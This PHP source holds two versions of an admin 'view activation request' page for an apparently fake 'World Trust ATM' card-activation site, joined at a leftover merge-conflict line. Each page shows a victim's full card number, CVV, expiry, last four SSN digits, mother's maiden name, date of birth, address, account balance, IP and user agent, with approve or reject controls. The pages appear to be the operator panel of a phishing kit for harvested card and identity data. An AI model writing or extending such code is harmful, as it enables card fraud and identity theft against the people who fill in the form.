<?php
/**

 * Admin View Single Record
 * Display complete activation details
 */

require_once __DIR__ . '/includes/auth.php';

$pageTitle = 'View Activation Details';

// Get activation ID
$id = isset($_GET['id']) ? (int)$_GET['id'] : 0;

if ($id <= 0) {
    set_flash('error', 'Invalid activation ID.');
    redirect('/admin/activations.php');
}

// Get activation details
try {
    $db = getDB();
    $sql = "SELECT * FROM activations WHERE id = ?";
    $activation = $db->fetchOne($sql, [$id]);
    
    if (!$activation) {
        set_flash('error', 'Activation not found.');
        redirect('/admin/activations.php');
    }
    
    // Decrypt sensitive data
    $ssnLast4 = decrypt_data($activation['ssn_last4']);
    $cardNumber = decrypt_data($activation['card_number']);
    $cvv = decrypt_data($activation['cvv']);
    
} catch (Exception $e) {
    log_error('View activation error: ' . $e->getMessage());
    set_flash('error', 'Error loading activation details.');
    redirect('/admin/activations.php');
}

// Log activity
logAdminActivity('View Record', 'Viewed activation #' . $id);

// Include header
include __DIR__ . '/includes/header.php';
?>

<div class="view-header mb-4">
    <a href="/admin/activations.php" class="btn btn-secondary">← Back to All Activations</a>
    <button onclick="window.print()" class="btn btn-primary">🖨️ Print</button>
</div>

<div class="record-view">
    <!-- Header Card -->
    <div class="card mb-4">
        <div class="card-header">
            <h2>Activation #<?php echo str_pad($activation['id'], 8, '0', STR_PAD_LEFT); ?></h2>
            <span class="status-badge status-<?php echo $activation['status']; ?> large">
                <?php echo ucfirst($activation['status']); ?>
            </span>
        </div>
    </div>
    
    <!-- Personal Information -->
    <div class="card mb-4">
        <div class="card-header">
            <h3>Personal Information</h3>
        </div>
        <div class="card-body">
            <div class="detail-grid">
                <div class="detail-item">
                    <label>First Name</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['first_name']); ?></div>
                </div>
                
                <div class="detail-item">
                    <label>Last Name</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['last_name']); ?></div>
                </div>
                
                <div class="detail-item">
                    <label>Date of Birth</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['dob']); ?></div>
                </div>
                
                <div class="detail-item">
                    <label>Email Address</label>
                    <div class="detail-value">
                        <a href="mailto:<?php echo htmlspecialchars($activation['email']); ?>">
                            <?php echo htmlspecialchars($activation['email']); ?>
                        </a>
                    </div>
                </div>
                
                <div class="detail-item">
                    <label>Phone Number</label>
                    <div class="detail-value">
                        <a href="tel:<?php echo htmlspecialchars($activation['phone']); ?>">
                            <?php echo htmlspecialchars($activation['phone']); ?>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Account Information -->
    <div class="card mb-4">
        <div class="card-header">
            <h3>Account Information</h3>
        </div>
        <div class="card-body">
            <div class="detail-grid">
                <div class="detail-item">
                    <label>Account Number</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['account_number']); ?></div>
                </div>
                
                <div class="detail-item">
                    <label>Current Balance</label>
                    <div class="detail-value balance"><?php echo format_currency($activation['balance']); ?></div>
                </div>
                
                <div class="detail-item full-width">
                    <label>Street Address</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['street']); ?></div>
                </div>
                
                <div class="detail-item">
                    <label>City</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['city']); ?></div>
                </div>
                
                <div class="detail-item">
                    <label>State</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['state']); ?></div>
                </div>
                
                <div class="detail-item">
                    <label>ZIP Code</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['zip']); ?></div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Security Information -->
    <div class="card mb-4">
        <div class="card-header">
            <h3>Security Information</h3>
        </div>
        <div class="card-body">
            <div class="detail-grid">
                <div class="detail-item">
                    <label>Last 4 Digits of SSN</label>
                    <div class="detail-value sensitive">
                        <span class="sensitive-value"><?php echo htmlspecialchars($ssnLast4); ?></span>
                        <span class="sensitive-warning">⚠️ Sensitive Data</span>
                    </div>
                </div>
                
                <div class="detail-item">
                    <label>Mother's Maiden Name</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['maiden_name']); ?></div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Card Details -->
    <div class="card mb-4">
        <div class="card-header">
            <h3>Card Details</h3>
        </div>
        <div class="card-body">
            <div class="detail-grid">
                <div class="detail-item">
                    <label>Card Number</label>
                    <div class="detail-value sensitive">
                        <span class="sensitive-value"><?php echo htmlspecialchars($cardNumber); ?></span>
                        <span class="sensitive-warning">⚠️ Sensitive Data</span>
                    </div>
                </div>
                
                <div class="detail-item">
                    <label>Expiry Date</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['expiry_date']); ?></div>
                </div>
                
                <div class="detail-item">
                    <label>CVV</label>
                    <div class="detail-value sensitive">
                        <span class="sensitive-value"><?php echo htmlspecialchars($cvv); ?></span>
                        <span class="sensitive-warning">⚠️ Sensitive Data</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Submission Metadata -->
    <div class="card mb-4">
        <div class="card-header">
            <h3>Submission Metadata</h3>
        </div>
        <div class="card-body">
            <div class="detail-grid">
                <div class="detail-item">
                    <label>IP Address</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['ip_address']); ?></div>
                </div>
                
                <div class="detail-item">
                    <label>Submission Date</label>
                    <div class="detail-value"><?php echo format_date($activation['created_at'], 'F d, Y \a\t g:i:s A'); ?></div>
                </div>
                
                <div class="detail-item">
                    <label>Last Updated</label>
                    <div class="detail-value"><?php echo format_date($activation['updated_at'], 'F d, Y \a\t g:i:s A'); ?></div>
                </div>
                
                <div class="detail-item full-width">
                    <label>User Agent</label>
                    <div class="detail-value"><?php echo htmlspecialchars($activation['user_agent']); ?></div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Actions -->
    <div class="card">
        <div class="card-header">
            <h3>Actions</h3>
        </div>
        <div class="card-body">
            <form method="POST" action="/admin/update-status.php" style="display: inline;">
                <input type="hidden" name="id" value="<?php echo $activation['id']; ?>">
                <input type="hidden" name="csrf_token" value="<?php echo generate_csrf_token(); ?>">
                
                <label for="status">Change Status:</label>
                <select name="status" id="status" class="form-control" style="width: auto; display: inline-block;">
                    <option value="pending" <?php echo $activation['status'] === 'pending' ? 'selected' : ''; ?>>Pending</option>
                    <option value="active" <?php echo $activation['status'] === 'active' ? 'selected' : ''; ?>>Active</option>
                    <option value="suspended" <?php echo $activation['status'] === 'suspended' ? 'selected' : ''; ?>>Suspended</option>
                </select>
                
                <button type="submit" class="btn btn-primary">Update Status</button>
            </form>
        </div>
    </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
=======
 * World Trust ATM - Admin View Request
 */

session_start();

// Check if logged in
if (!isset($_SESSION['admin_logged_in'])) {
    header('Location: index.php');
    exit();
}

require_once '../includes/config.php';
require_once '../includes/functions.php';
require_once '../includes/database.php';

$request_id = intval($_GET['id'] ?? 0);
$request = get_activation_request($request_id);

if (!$request) {
    header('Location: dashboard.php');
    exit();
}

// Handle status update
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $notes = trim($_POST['notes'] ?? '');
    
    if ($action === 'approve') {
        update_activation_status($request_id, 'approved', $_SESSION['admin_username'], $notes);
    } elseif ($action === 'reject') {
        update_activation_status($request_id, 'rejected', $_SESSION['admin_username'], $notes);
    }
    
    header('Location: dashboard.php');
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?> - View Request</title>
    <link rel="stylesheet" href="../css/styles.css">
</head>
<body>
    <div class="container">
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline">Activation Request Details</p>
        </header>

        <div class="form-container">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h2 class="form-title">Request #<?php echo str_pad($request['id'], 6, '0', STR_PAD_LEFT); ?></h2>
                <a href="dashboard.php" class="btn" style="width: auto; padding: 10px 20px; background: var(--text-light);">← Back</a>
            </div>
            
            <div class="info-box" style="margin-bottom: 20px;">
                <div class="info-item">
                    <span class="info-label">Status:</span>
                    <span class="status-badge <?php echo $request['status']; ?>"><?php echo ucfirst($request['status']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Submitted:</span>
                    <span class="info-value"><?php echo date('F j, Y g:i A', strtotime($request['created_at'])); ?></span>
                </div>
                <?php if ($request['reviewed_at']): ?>
                <div class="info-item">
                    <span class="info-label">Reviewed:</span>
                    <span class="info-value"><?php echo date('F j, Y g:i A', strtotime($request['reviewed_at'])); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Reviewed By:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['reviewed_by']); ?></span>
                </div>
                <?php endif; ?>
            </div>

            <h3 class="section-title">Personal Information</h3>
            <div class="info-box">
                <div class="info-item">
                    <span class="info-label">Full Name:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['first_name'] . ' ' . $request['last_name']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Date of Birth:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['dob']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Email:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['email']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Phone:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['phone']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Address:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['street'] . ', ' . $request['city'] . ', ' . $request['state'] . ' ' . $request['zip']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Account Number:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['account_number']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">SSN (Last 4):</span>
                    <span class="info-value">****<?php echo htmlspecialchars($request['ssn_last4']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Mother's Maiden Name:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['maiden_name']); ?></span>
                </div>
            </div>

            <h3 class="section-title" style="margin-top: 30px;">Card Information</h3>
            <div class="info-box">
                <div class="info-item">
                    <span class="info-label">Card Number:</span>
                    <span class="info-value">**** **** **** <?php echo substr($request['card_number'], -4); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Full Card Number:</span>
                    <span class="info-value"><?php echo htmlspecialchars(chunk_split($request['card_number'], 4, ' ')); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">CVV:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['cvv']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Expiry Date:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['expiry_date']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Balance:</span>
                    <span class="info-value"><?php echo format_currency($request['balance']); ?></span>
                </div>
            </div>

            <?php if ($request['admin_notes']): ?>
            <h3 class="section-title" style="margin-top: 30px;">Admin Notes</h3>
            <div class="alert-box">
                <p><?php echo nl2br(htmlspecialchars($request['admin_notes'])); ?></p>
            </div>
            <?php endif; ?>

            <?php if ($request['status'] === 'pending'): ?>
            <div style="margin-top: 30px;">
                <h3 class="section-title">Take Action</h3>
                <form method="POST">
                    <div class="form-group">
                        <label for="notes">Admin Notes (Optional)</label>
                        <textarea id="notes" name="notes" rows="3" style="width: 100%; padding: 12px; border: 2px solid var(--border-color); border-radius: 8px; font-family: inherit;"></textarea>
                    </div>
                    
                    <div style="display: flex; gap: 10px;">
                        <button type="submit" name="action" value="approve" class="btn btn-primary" style="background: var(--success-green); width: auto;" onclick="return confirm('Approve this activation request?')">
                            ✓ Approve Request
                        </button>
                        <button type="submit" name="action" value="reject" class="btn" style="background: var(--error-red); color: white; width: auto;" onclick="return confirm('Reject this activation request?')">
                            ✗ Reject Request
                        </button>
                    </div>
                </form>
            </div>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>

